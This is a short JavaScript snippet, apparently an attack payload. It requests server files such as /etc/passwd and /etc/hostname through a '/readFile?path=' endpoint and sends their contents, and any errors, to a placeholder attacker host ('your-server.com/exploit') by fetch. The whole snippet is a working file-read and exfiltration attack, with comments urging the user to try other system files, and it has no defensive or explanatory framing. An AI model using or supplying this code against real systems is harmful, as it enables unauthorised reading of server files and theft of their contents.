// Function to attempt to read server files (e.g., /etc/passwd)
function readFile(filePath) {
    fetch('/readFile?path=' + filePath)
        .then(response => response.text())
        .then(data => {
            // Send the file content to your server for logging
            fetch('http://your-server.com/exploit?fileContent=' + encodeURIComponent(data));
        })
        .catch(error => {
            // Log error if file reading fails
            fetch('http://your-server.com/exploit?error=' + encodeURIComponent(error));
        });
}

// Example: Try to read the /etc/passwd file
readFile('/etc/passwd');

// You can also try reading other common files like /etc/hostname, etc.
readFile('/etc/hostname');
